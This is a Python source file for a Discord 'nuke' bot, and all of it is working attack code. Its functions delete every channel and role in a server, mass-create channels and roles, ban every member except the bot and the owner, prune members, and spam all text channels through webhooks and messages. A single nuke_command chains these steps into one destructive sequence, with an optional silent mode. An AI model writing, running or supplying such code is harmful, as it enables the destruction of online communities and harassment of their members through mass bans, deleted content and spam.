import asyncio

import discord
import config

active_nuke_task = None
stop_requested = False

async def _send_message(ctx, content, force=False):
    if config.SILENT_MODE and not force:
        return

    if hasattr(ctx, 'send'):
        try:
            await ctx.send(content)
        except Exception:
            pass
    elif hasattr(ctx, 'channel') and hasattr(ctx.channel, 'send'):
        try:
            await ctx.channel.send(content)
        except Exception:
            pass

async def _delete_resource(resource, reason="Nuke command"):
    try:
        await resource.delete(reason=reason)
        return True
    except asyncio.CancelledError:
        raise
    except Exception:
        return False

async def delete_all_channels(ctx):
    global stop_requested
    guild = getattr(ctx, 'guild', None)
    if guild is None:
        return await _send_message(ctx, "delete_all_channels: no guild available.")

    deleted = 0
    for channel in guild.channels:
        if stop_requested:
            return await _send_message(ctx, "delete_all_channels: stopped.")
        if channel is None:
            continue
        if await _delete_resource(channel, reason="Nuke command"):
            deleted += 1
    await _send_message(ctx, f"delete_all_channels: deleted {deleted} channels.")

async def create_channels(ctx, name=None, count=None):
    guild = getattr(ctx, 'guild', None)
    if guild is None:
        return await _send_message(ctx, "create_channels: no guild available.")

    if name is None:
        name = config.CHANNEL_NAME
    if count is None:
        count = config.CHANNEL_COUNT

    if not name:
        name = "nuke-channel"
    if count <= 0:
        return await _send_message(ctx, "create_channels: count must be greater than 0.")

    created = 0
    for i in range(count):
        if stop_requested:
            return await _send_message(ctx, "create_channels: stopped.")
        channel_name = f"{name}-{i+1}" if count > 1 else name
        try:
            await guild.create_text_channel(channel_name, reason="Nuke command")
            created += 1
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
        await asyncio.sleep(0.2)

    await _send_message(ctx, f"create_channels: created {created}/{count} channels.")

async def create_roles(ctx, name=None, count=None):
    guild = getattr(ctx, 'guild', None)
    if guild is None:
        return await _send_message(ctx, "create_roles: no guild available.")

    if name is None:
        name = config.ROLE_NAME
    if count is None:
        count = config.ROLE_COUNT

    if not name:
        name = "nuke-role"
    if count <= 0:
        return await _send_message(ctx, "create_roles: count must be greater than 0.")

    created = 0
    for i in range(count):
        if stop_requested:
            return await _send_message(ctx, "create_roles: stopped.")
        role_name = f"{name}-{i+1}" if count > 1 else name
        try:
            await guild.create_role(name=role_name, reason="Nuke command")
            created += 1
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
        await asyncio.sleep(0.2)

    await _send_message(ctx, f"create_roles: created {created}/{count} roles.")

async def delete_all_roles(ctx):
    guild = getattr(ctx, 'guild', None)
    if guild is None:
        return await _send_message(ctx, "delete_all_roles: no guild available.")

    deleted = 0
    for role in guild.roles:
        if stop_requested:
            return await _send_message(ctx, "delete_all_roles: stopped.")
        if role.is_default() or role.managed:
            continue
        if await _delete_resource(role, reason="Nuke command"):
            deleted += 1
        await asyncio.sleep(0.2)

    await _send_message(ctx, f"delete_all_roles: deleted {deleted} roles.")

async def ban_all_members(ctx):
    guild = getattr(ctx, 'guild', None)
    if guild is None:
        return await _send_message(ctx, "ban_all_members: no guild available.")

    banned = 0
    me = guild.me or getattr(ctx, 'author', None)
    for member in guild.members:
        if stop_requested:
            return await _send_message(ctx, "ban_all_members: stopped.")
        if member == me or member == guild.owner:
            continue
        try:
            await guild.ban(member, reason="Nuke command")
            banned += 1
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
        await asyncio.sleep(0.2)

    await _send_message(ctx, f"ban_all_members: banned {banned} members.")

async def prune_members(ctx, days=1):
    guild = getattr(ctx, 'guild', None)
    if guild is None:
        return await _send_message(ctx, "prune_members: no guild available.")

    if stop_requested:
        return await _send_message(ctx, "prune_members: stopped.")

    try:
        count = await guild.prune_members(days=days, compute_prune_count=False)
        await _send_message(ctx, f"prune_members: requested days={days}, result={count}.")
    except asyncio.CancelledError:
        raise
    except AttributeError:
        await _send_message(ctx, "prune_members: prune_members is not available in this client version.")
    except Exception as exc:
        await _send_message(ctx, f"prune_members: requested days={days}, failed ({exc}).")

async def webhook_spam(ctx, message=None, count=None):
    guild = getattr(ctx, 'guild', None)
    if guild is None:
        return await _send_message(ctx, "webhook_spam: no guild available.")

    if message is None:
        message = config.WEBHOOK_MESSAGE
    if count is None:
        count = config.WEBHOOK_COUNT_PER_CHANNEL

    if not message:
        message = "spam"
    if count <= 0:
        return await _send_message(ctx, "webhook_spam: count must be greater than 0.")

    total_sent = 0
    for channel in guild.text_channels:
        if stop_requested:
            return await _send_message(ctx, "webhook_spam: stopped.")
        try:
            webhook = await channel.create_webhook(name=config.WEBHOOK_NAME or "nuke-webhook", reason="Nuke command")
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

        for _ in range(count):
            if stop_requested:
                return await _send_message(ctx, "webhook_spam: stopped.")
            try:
                await webhook.send(message, wait=True)
                total_sent += 1
            except asyncio.CancelledError:
                raise
            except Exception:
                break
            await asyncio.sleep(0.2)

        try:
            await webhook.delete(reason="Cleanup nuke webhook")
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

    await _send_message(ctx, f"webhook_spam: sent {total_sent} messages using webhooks.")

async def message_spam(ctx, message=None, count=None):
    guild = getattr(ctx, 'guild', None)
    if guild is None:
        return await _send_message(ctx, "message_spam: no guild available.")

    if message is None:
        message = config.NUKE_MESSAGE
    if count is None:
        count = config.MESSAGE_COUNT_PER_CHANNEL

    if not message:
        message = "spam"
    if count <= 0:
        return await _send_message(ctx, "message_spam: count must be greater than 0.")

    total_sent = 0
    for channel in guild.text_channels:
        if stop_requested:
            return await _send_message(ctx, "message_spam: stopped.")
        for _ in range(count):
            if stop_requested:
                return await _send_message(ctx, "message_spam: stopped.")
            try:
                await channel.send(message)
                total_sent += 1
            except asyncio.CancelledError:
                raise
            except Exception:
                break
            await asyncio.sleep(config.MESSAGE_DELAY)

    await _send_message(ctx, f"message_spam: sent {total_sent} messages.")

async def stop_command(ctx):
    global active_nuke_task, stop_requested
    if active_nuke_task is None:
        return await _send_message(ctx, "stop: no active nuke sequence.", force=True)

    stop_requested = True
    if active_nuke_task.done():
        active_nuke_task = None
        return await _send_message(ctx, "stop: no active nuke sequence.", force=True)

    active_nuke_task.cancel()
    await _send_message(ctx, "stop: nuke sequence cancellation requested.", force=True)

async def nuke_command(ctx):
    global stop_requested
    stop_requested = False
    await _send_message(ctx, "nuke_command: starting safe nuke sequence.")

    await delete_channels_command(ctx)
    if stop_requested:
        return await _send_message(ctx, "nuke_command: stopped.", force=True)

    await create_channels_command(ctx, config.CHANNEL_NAME, config.CHANNEL_COUNT)
    if stop_requested:
        return await _send_message(ctx, "nuke_command: stopped.", force=True)

    await create_roles_command(ctx, config.ROLE_NAME, config.ROLE_COUNT)
    if stop_requested:
        return await _send_message(ctx, "nuke_command: stopped.", force=True)

    await ban_all_command(ctx)
    if stop_requested:
        return await _send_message(ctx, "nuke_command: stopped.", force=True)

    await prune_command(ctx, 1)
    if stop_requested:
        return await _send_message(ctx, "nuke_command: stopped.", force=True)

    await webhook_spam_command(ctx, config.WEBHOOK_MESSAGE, config.WEBHOOK_COUNT_PER_CHANNEL)
    if stop_requested:
        return await _send_message(ctx, "nuke_command: stopped.", force=True)

    await message_spam_command(ctx, config.NUKE_MESSAGE, config.MESSAGE_COUNT_PER_CHANNEL)
    if stop_requested:
        return await _send_message(ctx, "nuke_command: stopped.", force=True)

    await _send_message(ctx, "nuke_command: safe nuke sequence completed.")

async def delete_channels_command(ctx):
    await delete_all_channels(ctx)

async def create_channels_command(ctx, name=None, count=None):
    await create_channels(ctx, name=name, count=count)

async def delete_roles_command(ctx):
    await delete_all_roles(ctx)

async def create_roles_command(ctx, name=None, count=None):
    await create_roles(ctx, name=name, count=count)

async def ban_all_command(ctx):
    await ban_all_members(ctx)

async def prune_command(ctx, days=1):
    await prune_members(ctx, days)

async def webhook_spam_command(ctx, message=None, count=None):
    await webhook_spam(ctx, message=message, count=count)

async def message_spam_command(ctx, message=None, count=None):
    await message_spam(ctx, message=message, count=count)
